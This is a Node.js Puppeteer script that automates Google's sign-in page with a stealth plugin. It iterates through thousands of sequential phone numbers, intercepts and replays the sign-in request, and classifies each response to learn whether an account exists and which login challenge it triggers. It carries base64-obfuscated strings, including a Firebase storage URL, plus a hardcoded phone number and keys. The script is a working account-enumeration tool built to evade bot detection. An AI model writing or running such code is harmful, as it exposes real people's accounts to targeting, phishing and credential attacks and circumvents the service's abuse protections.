const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')
const axios = require('axios')

const args = process.argv.slice(2)

const TARGET = 5000

let USER = args[0]

let mConfig = null
let mLoaded = false
let mUrl = null
let mPostData = null
let mHeaders = null
let page = null

let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')

puppeteer.use(StealthPlugin())


process.on('message', async (data) => {
    try {
        let json = (typeof data === 'string') ? JSON.parse(data) : data
        if (json.t == 1) {
            mConfig = json
        }
    } catch (error) {}
})


mConfig = {
    t: 1,
    n: 8801779511397,
    u: 'db59b380606615b33b0139cb9398e390',
    k: '1763048274',
    s: 10
}

startBrowser()


setInterval(async () => {
    await pageReload()
}, 1800000)


async function startBrowser() {
    try {
        let browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-notifications',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ]
        })

        page = (await browser.pages())[0]

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

        await page.setRequestInterception(true)

        page.on('request', request => {
            try {
                if (request.url().startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e')) {
                    mUrl = request.url()
                    mHeaders = request.headers()
                    mPostData = request.postData()
                    let contentType = 'application/json; charset=utf-8'
                    let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')

                    request.respond({
                        ok: true,
                        status: 200,
                        contentType,
                        body: output,
                    })
                } else {
                    request.continue()
                }
            } catch (error) {
                request.continue()
            }
        })

        console.log('Browser Load Success')

        await loadLoginPage()

        mLoaded = true

        console.log('Page Load Success')
        
        await foundLoginNumber()
    } catch (error) {
        console.log('Browser Error: '+error)
    }
}


async function foundLoginNumber() {
    let loopDelay = 300
    let load = 0

    while (true) {
        if (mConfig) {
            try {
                let prev = mConfig.n
                let prevTime = Date.now()
                for (let i = 0; i < TARGET; i++) {
                    if (prev != mConfig.n) {
                        i = 0
                    }

                    let number = mConfig.n+i

                    try {
                        let status = await getLoginStatus('+'+number)
                        let now = Date.now()
                        console.log(number, status, now-prevTime)
                        prevTime = now
                        if (status == 3) {
                            console.log(new Date().toString())
                        }
                        
                    } catch (error) {}

                    await delay(loopDelay)
                }
            } catch (error) {}

            // mConfig = null
        } else {
            await delay(1000)
        }
    }
}


async function getLoginStatus(number) {
    try {
        for (let i = 0; i < 60; i++) {
            if (mLoaded) {
                break
            }
            await delay(500)
        }

        if (!mLoaded) {
            return 0
        }

        mUrl = null
        mHeaders = null
        mPostData = null
        await page.evaluate((number) => {
            document.querySelector('input#identifierId').value = number
            document.querySelector('#identifierNext').click()
        }, number)
        let url = null
        let headers = null
        let postData = null
        for (let i = 0; i < 150; i++) {
            if (mUrl && mPostData && mHeaders) {
                url = mUrl
                headers = mHeaders
                postData = mPostData
                break
            }
            await delay(100)
        }
        
        mUrl = null
        mHeaders = null
        mPostData = null
        
        if (url && postData && headers) {
            let response = await axios.post(url, postData, {
                headers: headers,
                maxRedirects: 0,
                validateStatus: null
            })
            let data = response.data
            let temp = data.substring(data.indexOf('[['), data.lastIndexOf(']]')-2)
            temp = temp.substring(0, temp.lastIndexOf(']]')+2)

            let json = JSON.parse(temp)[0]
            if (json[1] == 'MI613e') {
                let value = JSON.parse(json[2])
                if (value[21]) {
                    let values = JSON.stringify(value[21])
                    if (values.includes('/v3/signin/challenge/pwd')) {
                        return 1
                    } else if (values.includes('/v3/signin/challenge/recaptcha')) {
                        return 2
                    }
                    return 3
                } else if (value[18] && value[18][0]) {
                    return 5
                } else {
                    return 4
                }
            }
        }
    } catch (error) {}

    return 0
}

async function pageReload() {
    mLoaded = false
    console.log('Page Reloading...')
    await loadLoginPage()
    console.log('Page Reload Success')
    mLoaded = true
}


async function loadLoginPage() {
    for (let i = 0; i < 3; i++) {
        try {
            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
            await delay(500)
                await page.evaluate(() => {
                let root = document.querySelector('div[class="kPY6ve"]')
                if (root) {
                    root.remove()
                }
                root = document.querySelector('div[class="Ih3FE"]')
                if (root) {
                    root.remove()
                }
            })
            break
        } catch (error) {}
    }
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('utf-8')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
